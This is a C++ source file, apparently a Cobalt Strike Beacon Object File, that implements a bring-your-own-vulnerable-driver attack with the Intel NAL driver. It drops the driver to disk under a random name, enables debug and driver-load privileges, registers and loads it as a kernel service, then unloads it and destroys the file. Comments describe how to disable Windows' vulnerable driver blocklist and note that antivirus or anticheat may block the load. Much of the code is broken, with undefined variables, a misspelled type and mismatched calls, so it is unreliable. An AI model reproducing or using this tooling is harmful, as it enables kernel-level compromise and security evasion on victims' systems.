#include <intel_driver.hpp>
namespace Intel {

	BOOL IsRunning() {
		const HANDLE handle = KERNEL32$CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (handle && handle != INVALID_HANDLE_VALUE) {

			KERNEL32$CloseHandle(handle);
			return true;
		}

		return false;
	}

	LPWSTR GetDriverPath(wchar_t *driver_name) {

		wchar_t end = L'\\';
		uint32_t length = MAX_PATH + 1 * sizeof(wchar_t);

		wchar_t driver_path = (whcar_t*) NTDLL$RtlAllocateHeap(ctx->heap, 0, length);
		if (!driver_path) {
			return nullptr;
		}

		size_t driver_length = Beacon$WcsLength(driver_name);
		uint32_t path_length = KERNEL32$GetTempPathW(MAX_PATH + 1, driver_path);

		if (!path_length) {
			NTDLL$RtlFreeHeap(ctx->heap, 0, driver_path);
			return nullptr;
		}

		// NOTE: make sure the full path does not write OOB
		if (path_length + driver_length + 2 >= MAX_PATH + 1) { 
			NTDLL$RtlFreeHeap(ctx->heap, 0, driver_path);
			return nullptr;
		}

		if (driver_path[path_length - 1] == path_end) {
			driver_path[path_length - 1] = L'\0';
		}

		driver_path[path_length] = path_end;
		driver_path[path_length + 1] = L'\0';

		Beacon$WcsConcat(driver_path + path_length + 1, driver_name, driver_length);
		return driver_path;
	}

	BOOL AquireDebugPrivilege() {

		HMODULE ntdll = KERNEL32$GetModuleHandle();
		if (!ntdll) {
			return false;
		}

		bool enabled = false;
		uint32_t se_debug = 20UL;

		// NOTE: should this be dynamically loaded through FindModuleEntry instead? (probably fine...)
		const auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t) KERNEL32$GetProcAddress(ntdll, "RtlAdjustPrivilege");

		if (!NT_SUCCESS(ntstatus = RtlAdjustPrivilege(se_debug, true, false, &enabled))) {
			KERNEL32$CloseHandle(handle);
			return false;
		}

		return true;
	}

	BOOL ServiceRegisterReload(wchar_t *driver_name) {

		const static DWORD service_type = 1;
		const wchar_t n_path[WMAX_PATH] = L"\\??\\";

		size_t npath_length = WcsLength(n_path);
		Beacon$WcsConcat(n_path + npath_length, driver_name, Beacon$MbsLength(driver_name));

		wchar_t service_reg[WMAX_PATH] = service_path;
		Beacon$WcsConcat(service_reg + Beacon$WcsLength(service_reg), driver_name, Beacon$WcsLength(driver_name));

		HKEY dservice = { };
		LSTATUS status = KERNEL32$RegCreateKeyW(HKEY_LOCAL_MACHINE, service_reg, &dservice);
		if (status != ERROR_SUCCESS) {
			return false;
		}
		
		status = KERNEL32$RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, n_path, (DWORD) Beacon$WcsLength(n_path) * sizeof(wchar_t));
		if (status != ERROR_SUCCESS) {
			return false;
		}

		status = KERNEL32$RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &service_type, sizeof(DWORD));
		if (status != ERROR_SUCCESS) {
			return false;
		}

		KERNEL32$RegKeyClose(dservice);

		HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
		if (!ntdll) {
			return false;
		}

		// TODO: clear repeating pattern 
		const auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t) KERNEL32$GetProcAddress(ntdll, "RtlAdjustPrivilege");
		const auto NtLoadDriver = (NtLoadDriver_t) KERNEL32$GetProcAddress(ntdll, "NtLoadDriver");

		if (!NT_SUCCESS(ntstatus = RtlAdjustPrivilege(se_debug, true, false, &enabled))) {
			KERNEL32$CloseHandle(handle);
			return false;
		}

		uint32_t load_privilege = 10UL;
		bool enabled = false;

		if (!NT_SUCCESS(ntstatus = NtLoadDriver(load_privilege, true, false, &enabled))) {
			return false;
		}

		wchar_t driver_reg[WMAX_PATH] = driver_reg_path;
		Beacon$WcsConcat(driver_reg + Beacon$WcsLength(driver_reg), driver_name, Beacon$WcsLength(driver_name));

		UNICODE_STRING service_name = { };
		Beacon$RtlInitUnicodeString(&service_name, driver_reg);

		if (!NT_SUCCESS(ntstatus = NtLoadDriver(&service_name))) {
			return false;
		}

		if (Status == 0xC0000603) { //STATUS_IMAGE_CERT_REVOKED
			//Log("[-] Vulnerable driver list is enabled and has blocked the driver from loading.");
			//Log("[-] Registry path to disable vulnerable driver list: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config");
			//Log("[-] Set 'VulnerableDriverBlocklistEnable' as dword to 0");
			return false;
		}
		else if (Status == 0xC0000022 || Status == 0xC000009A) { //STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES
			//Log("[-] Access Denied or Insufficient Resources. Probably some anticheat or antivirus running blocking the load of vulnerable driver");
			return false;
		}

		return true;
	}

	BOOL ServiceStopRemove(wchar_t *driver_name) {

		// TODO: repeating pattern
		HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
		if (!ntdll) {
			return false;
		}
		
		wchar_t driver_reg[WMAX_PATH] = driver_reg_path;
		Beacon$WcsConcat(driver_reg + Beacon$WcsLength(driver_reg), driver_name, Beacon$WcsLength(driver_name));

		UNICODE_STRING service_name = { };
		Beacon$RtlInitUnicodeString(&service_name, driver_reg);

		wchar_t service_reg[WMAX_PATH] = service_path;
		Beacon$WcsConcat(service_reg + Beacon$WcsLength(service_reg), driver_name, Beacon$WcsLength(driver_name));

		HKEY dservice = { };
		LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, service_reg, &dservice);

		if (status != ERROR_SUCCESS) {
			if (status == ERROR_FILE_NOT_FOUND) {
				return true;
			}
			return false;
		}

		KERNEL32$RegCloseKey(dservice);

		auto NtUnloadDriver = (NtUnloadDriver_t) KERNEL32$GetProcAddress(ntdll, "NtUnloadDriver");
		if (!NT_SUCCESS(NtUnloadDriver(&service_name))) {

			status = ADVAPI32$RegDeleteTreeW(HKEY_LOCAL_MACHINE, service_reg);
			return (status == ERROR_SUCCESS);
		}

		status = ADVAPI32$RegDeleteTreeW(HKEY_LOCAL_MACHINE, service_reg);
		if (status != ERROR_SUCCESS) {
			return false;
		}

		return true;
	}

	BOOL DriverUnload(HANDLE handle, wchar_t *driver_name, size_t size) {

		BOOL success = false;
		if (handle && handle != INVALID_HANDLE_VALUE) {
			KERNEL32$CloseHandle(handle);
		}

		wchar_t *driver_path = GetDriverPath(driver_name);
		if (!ServiceStopRemove(driver_path)) {
			goto defer;
		}

		if (!Beacon$DestroyFileData(driver_path, size)) {
			goto defer;
		}
		
		success = true;

	defer:
		if (driver_path) {
			NTDLL$RtlFreeHeap(GetProcessHeap(), 0, driver_path);
			driver_path = nullptr;
		}

		return success;
	}

	HANDLE DriverLoad(wchar_t *driver_name, uint8_t *driver, size_t size) {

		HANDLE handle = nullptr;
		bool success = false;

		int length = Beacon$RandomNumber32() % 20 + 10;
		int rand_n = Beacon$RandomNumber32();

		wchar_t *driver_path = GetDriverPath();
		if (!driver_path) {
			goto defer;
		}

		if (IsRunning()) {
			// NAL is already in use
			goto defer;
		}

		for (int i = 0; i < length; i++) {
			driver_name[i] = alphanum[rand_n % sizeof(alphanum) - 1];
		}

		// NOTE: this BOF will never be (or shouldn't be) cached 
		Beacon$MemSet(driver_path, 0, sizeof(driver_path));

		if (!Beacon$WriteToDisk(driver_path, driver, size) ||
			!AquireDebugPrivilege()) { 
			goto defer;
		}

		if (!ServiceRegisterRestart(driver_name)) {
			goto defer;
		}

		handle = KERNEL32$CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!handle || handle == INVALID_HANDLE_VALUE) {

			// TODO: return an NTSTATUS from DriverLoad/Unload 
			DriverUnload(handle, driver_name);
			goto defer;
		}

	defer:
		if (!success) {
			if (driver_path) {
				NTDLL$RtlFreeHeap(ctx->heap, 0, driver_path);
				driver_path = nullptr;
			}
			if (handle) {
				KERNEL32$CloseHandle(handle);
				handle = nullptr;
			}
		}

		return handle;
	}
}
